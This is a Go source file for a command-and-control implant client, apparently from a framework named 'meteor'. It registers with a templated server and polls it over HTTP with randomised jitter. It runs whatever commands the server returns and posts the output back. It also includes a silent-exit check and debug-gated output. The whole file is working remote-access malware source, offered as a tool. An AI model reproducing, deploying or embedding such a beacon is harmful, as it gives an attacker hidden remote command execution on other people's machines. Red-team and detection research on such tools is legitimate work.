package main

import (
	"bytes"
	"fmt"
	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"time"
)

// SERVER is the IP/port of the web server to connect to (ex: `192.168.1.2:1234`)
var SERVER = "$$SERVER$$"

// INTERVAL is how long to sleep between callbacks
var INTERVAL = 1234123499

// DELTA is the jitter/variation in interval per cycle
var DELTA = 4321432199

// REGFILE is the path to the disk location where the registration file will be kept (ex: `/etc/ botconf.txt`)
var REGFILE = "$$REGFILE$$"

// OBFTEXT is the obfuscation text that will be used when generating the regfile
var OBFTEXT = "$$OBFTEXT$$"

// DEBUG specifies if execution of the client will write output
var DEBUG = false

func main() {
	if len(os.Args) != 2 && len(os.Args) != 3 {
		if DEBUG {
			fmt.Println("Executed without arguments, exiting...")
		}
		os.Exit(0)
	}
	for {
		var payload []byte
		regstat := cUtils.CheckRegStatus(REGFILE)
		if DEBUG {
			fmt.Printf("RegStat: %t\n", regstat)
		}
		if regstat {
			payload = cUtils.GenCheckinRaw(REGFILE, OBFTEXT)
		} else {
			payload = cUtils.GenRegisterRaw(INTERVAL, DELTA, REGFILE, OBFTEXT)
		}
		if DEBUG {
			fmt.Printf("Payload: %s\n", payload)
		}

		if DEBUG {
			fmt.Printf("Sending payload over web req...\n")
		}
		respData := sendWebReq(SERVER, payload)

		if DEBUG {
			fmt.Printf("Got response: %s\n", respData)
		}

		resp := &mcs.MCS{}
		err := proto.Unmarshal(respData, resp)
		if err != nil {
			if DEBUG {
				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
			}
			endCheck()
			continue
		}
		stat := resp.GetStatus()
		if DEBUG {
			fmt.Printf("Recd status: %d\n", stat)
		}
		if stat == 204 { // no actions rec'd
			endCheck()
			continue
		}
		actions := resp.GetActions()
		for _, acn := range actions {
			uid := acn.GetUuid()
			if DEBUG {
				fmt.Printf("Handling action: %s\n", uid)
			}
			mod := acn.GetMode()
			args := acn.GetArgs()
			acnOut := cUtils.ExecCommand(mod, args)
			acnData := cUtils.GenAddResultRaw(uid, acnOut)
			if DEBUG {
				fmt.Printf("Sending action result over request...\n")
			}
			sendWebReq(SERVER, acnData)
		}
		endCheck()

	}
}

func endCheck() {
	if DEBUG {
		fmt.Printf("Checking if program should exit...\n")
	}
	if len(os.Args) == 3 {
		os.Exit(0)
	}
	min := INTERVAL - DELTA
	max := INTERVAL + DELTA
	sleeptime := rand.Intn(max-min) + min
	if DEBUG {
		fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
	}
	time.Sleep(time.Duration(sleeptime) * time.Second)
}

func sendWebReq(server string, payload []byte) []byte {
	url := "http://" + server + "/lf"
	errDat := &mcs.MCS{
		Status: 500,
	}
	errProto, _ := proto.Marshal(errDat)
	resp, err := http.Post(url, "", bytes.NewBuffer(payload))
	if err != nil {
		return errProto
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return errProto
	}
	return data
}
